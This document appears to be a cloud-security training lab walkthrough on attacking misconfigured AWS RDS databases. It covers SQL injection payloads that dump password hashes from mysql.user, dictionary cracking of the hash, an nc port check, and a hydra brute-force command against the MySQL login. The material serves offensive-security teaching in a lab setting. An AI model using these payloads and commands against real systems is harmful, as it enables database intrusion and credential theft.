# AWS RDS Misconfigurations

## Introduction

AWS RDS instances just like standard database installations can end up being misconfgured. However, unlike standard databases the misconfigurations mostly arises out of administrators choosing to use the Master User that is created during the setup of a new instance. This user, although not the real 'root' user in RDS systems, is used to manage other aspects of the system.

Common misconfigurations include weak passwords, setting the RDS instance to become publically available and allowing multiple applications to use the same MasterUser account.

## What are we going to cover?

In this chapter we will take a look at some of the common misconfigurations in RDS and see how we can use them to gain access to data on an RDS instance. 

## Steps to setup lab

Run the following script in the student VM to bring up the target lab (DO NOT RUN THIS IF LAB IS ALREADY CREATED)

    deploy-clouddb

The output of this script is (note them)

- the internal IP address of the target EC2 running the web app
- And RDS endpoint name

**Please Note: This script may take up to 10 minutes to complete**

> If you see any error, please inform one of the trainers

## Steps to attack

### Attack 1 - Weak password and read access to mysql.user

Set Firefox to go through Burp by changing the proxy settings

Connect to the attacker using the SSH tunnel

    ssh -D 9090 -l cloudhacker $cloudhackerip

Browse the application at http://INTERNAL-IP-OF-TARGET-EC2

Register a new user and login with that user

The Product Search page is vulnerable to SQL Injection

#### Find number of columns

Intercept a product search request in Burp Suite

Send it to Repeater

In Repeater, right click and select "URL-encode as you type"

Use the following as input to the "search" parameter

    ' order by 10 -- //

    ' order by 8 -- //

    ' order by 4 -- //

    ' order by 5 -- //

#### Identifying which columns are to be used

The columns numbers visible in HTTP response can be used

    ' union select 1,2,3,4,5  -- //

    ' union select null, @@version, user(), @@datadir, @@hostname -- //

    ' union select null, user, password, null, null from mysql.user -- // 

Obtain the hash of the 'rdsroot' user 

If the password is weak, this can be cracked using tools like hashcat, john or even custom scripts.

We wrote a simple python script that will allow you to crack the password using a dictionary. Provide the hash to the following script after removing the *

    mysqlcrack <hash-here> custom-rockyou.txt

For example:

    mysqlcrack 2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 custom-rockyou.txt

Connect to the mysql endpoint directly using the client using the credentials of 'rdsroot' and the cracked password. RDS Endpoint is the hostname of the RDS (without the :3306)

    mysql -u rdsroot -p -h <RDS-ENDPOINT>


### Attack 2 - Port exposed to the Internet

This is a staged scenario. We will be attacking the RDS instance from the attacker VM inside your AWS account.

Verify the visibility of this port. Replace `rds-endpoint` with the actual name of the RDS endpoint

    nc <RDS-ENDPOINT> 3306 -zv

As the port is exposed, brute force or dictionary attacks can be mounted using tools like hydra

    hydra -f -t2 -l rdsroot -P custom-rockyou.txt <RDS-ENDPOINT> mysql

## Additional references

- [Brute force MySQL](https://robert.penz.name/1416/how-to-brute-force-a-mysql-db/)
- [AWS security for RDS](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/UsingWithRDS.html)
- [Best Practices for Amazon RDS](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/CHAP_BestPractices.html)